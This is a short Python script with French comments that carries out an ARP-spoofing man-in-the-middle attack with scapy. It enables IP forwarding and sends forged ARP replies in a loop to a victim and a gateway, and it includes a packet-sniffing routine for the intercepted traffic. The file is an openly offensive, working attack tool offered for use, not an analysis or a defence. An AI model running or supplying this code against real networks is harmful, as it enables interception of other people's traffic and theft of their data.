#!/usr/bin/env python3

from scapy.all import *
import sys
import os

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] Forwarding IP activé pour rediriger le trafic.")

def disable_ip_forwarding():
    """Désactive le forwarding IP."""
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] Forwarding IP désactivé.")

def arp_spoof(victim_ip, gateway_ip, attacker_mac):
    """Envoie des paquets ARP spoofing en boucle pour usurper les identités."""
    # Spoof PC1 (victim) en se faisant passer pour la passerelle
    spoof_to_victim = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=attacker_mac)
    # Spoof la passerelle en se faisant passer pour PC1
    spoof_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=victim_ip, hwsrc=attacker_mac)

    print(f"[+] Envoi en boucle des paquets ARP spoofing...")
    try:
        while True:
            send(spoof_to_victim, verbose=False)
            send(spoof_to_gateway, verbose=False)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Arrêt de l'attaque.")

def sniff_and_display():
    """Capture et affiche les paquets entre les victimes."""
    print("[+] Capture des paquets entre PC1 et la passerelle...")
    sniff(filter="ip", prn=lambda x: x.show())

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <victim_ip> <gateway_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    try:
        print("[+] Début de l'attaque MITM...")
        enable_ip_forwarding()

        # Obtenir l'adresse MAC de l'attaquant
        attacker_mac = get_if_hwaddr(conf.iface)
        
        # Démarrage de l'ARP Spoofing
        arp_spoof(victim_ip, gateway_ip, attacker_mac)
        
    except KeyboardInterrupt:
        print("\n[!] Nettoyage et arrêt...")
        disable_ip_forwarding()
        sys.exit(0)

